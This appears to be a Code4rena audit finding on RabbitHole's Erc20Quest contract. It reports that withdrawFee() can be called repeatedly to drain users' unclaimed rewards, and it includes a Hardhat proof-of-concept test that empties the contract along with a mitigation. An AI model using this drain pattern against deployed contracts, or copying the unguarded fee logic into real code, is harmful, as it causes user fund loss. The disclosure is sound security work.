# Original link
https://github.com/code-423n4/2023-01-rabbithole-findings/issues/144
# Lines of code

https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102


# Vulnerability details

## Impact
In `Erc20Quest` contract the `withdrawFee` function is used to pull out protocol fee from the contract. The docs and developer comments of the contract states that any user with unclaimed rewards should always be able to claim the rewards anytime in the future and owner must never forcefully withdraw user's claim.
```solidity
    /// @notice Function that allows the owner to withdraw the remaining tokens in the contract
    /// @dev Every receipt minted should still be able to claim rewards (and cannot be withdrawn). This function can only be called after the quest end time
    /// @param to_ The address to send the remaining tokens to
    function withdrawRemainingTokens(address to_) public override onlyOwner {
        super.withdrawRemainingTokens(to_);
        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;
        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;
        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);
    }

    // ...

    /// @notice Sends the protocol fee to the protocolFeeRecipient
    /// @dev Only callable when the quest is ended
    function withdrawFee() public onlyAdminWithdrawAfterEnd {
        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());
    }
```

However, as per the current implementation of these `withdrawFee` function, it can be invoked multiple times by the `owner`. Hence resulting in `owner` pulling out more funds than he should be allowed to pull.

#### Actual Impact
The `owner` is able to claim more funds than he is allowed to. Resulting in the loss for users who still have some pending unclaimed rewards in the Quest contract. The implementation also deviates from its specs as this issue prevent users from claiming their legitimate rewards.

## Proof of Concept
A new test file was created and ran using `npx hardhat test path-to-file`.
```typescript
import { expect } from 'chai'
import { ethers, upgrades } from 'hardhat'

const AddressZero = ethers.constants.AddressZero;

describe('Quest Bug', () => {
    it('loss of funds due to repeated withdrawFee() invokation', async () => {
        // Minimal Setup
        const [owner, user,] = await ethers.getSigners();
        const questA = 'questA'
        const expiryDate = Math.floor(Date.now() / 1000) + 100000
        const startDate = Math.floor(Date.now() / 1000) + 1000
        const RabbitHoleReceipt = (await upgrades.deployProxy((await ethers.getContractFactory('RabbitHoleReceipt')), [
            AddressZero, owner.address, AddressZero, 0
        ]))
        const QuestFactory = (await upgrades.deployProxy((await ethers.getContractFactory('QuestFactory')), [
            owner.address, RabbitHoleReceipt.address, owner.address
        ]))
        const SampleERC20 = await (await ethers.getContractFactory('SampleERC20')).deploy("", "", 240, owner.address)
        await QuestFactory.setRewardAllowlistAddress(SampleERC20.address, true);

        // New Quest
        const createQuestTx = await QuestFactory.createQuest(
            SampleERC20.address,
            expiryDate,
            startDate,
            2,          // max participant
            100,        // reward amount
            'erc20',
            questA
        );
        const waitedTx = await createQuestTx.wait();
        const event = waitedTx?.events?.find((event: any) => event.event === 'QuestCreated');
        const [, contractAddress] = event.args;
        const QuestContract = await ethers.getContractAt('Erc20Quest', contractAddress);

        // transferring required token to Quest contract
        await SampleERC20.transfer(QuestContract.address, 240)
        expect(await SampleERC20.balanceOf(QuestContract.address)).to.eq(240);
        await QuestContract.start();
        await ethers.provider.send('evm_increaseTime', [startDate])

        // Get RabbitHoleReceipt token
        const messageHash1 = ethers.utils.solidityKeccak256(['address', 'string'], [user.address.toLowerCase(), questA])
        const signature1 = await owner.signMessage(ethers.utils.arrayify(messageHash1))
        await QuestFactory.connect(user).mintReceipt(questA, messageHash1, signature1)
        expect(await RabbitHoleReceipt.balanceOf(user.address)).to.equal(1)

        // User didn't come to claim the rewards
        expect(await SampleERC20.balanceOf(QuestContract.address)).to.equal(240)    // balance of Quest = 240 tokens

        await ethers.provider.send('evm_increaseTime', [expiryDate])

        // withdraw protocol fee
        await QuestContract.withdrawFee();                                          // 20 tokens were transferred to owner
        expect(await SampleERC20.balanceOf(owner.address)).to.equal(20)
        expect(await SampleERC20.balanceOf(QuestContract.address)).to.equal(220)

        for (let i = 0; i < 11; i++) {
            await QuestContract.withdrawFee();                                      // 20 tokens were transferred to owner on each invocation
        }
        // The contract gets drained
        expect(await SampleERC20.balanceOf(owner.address)).to.equal(240)
        expect(await SampleERC20.balanceOf(QuestContract.address)).to.equal(0)

        await ethers.provider.send('evm_increaseTime', [-startDate])
        await ethers.provider.send('evm_increaseTime', [-expiryDate])
    })
})
```

## Tools Used
Hardhat

## Recommended Mitigation Steps
The `owner` should not be allowed to call `withdrawFee()` repeatedly. The fee collection can be made automatic by transferring the fee on every user claim.
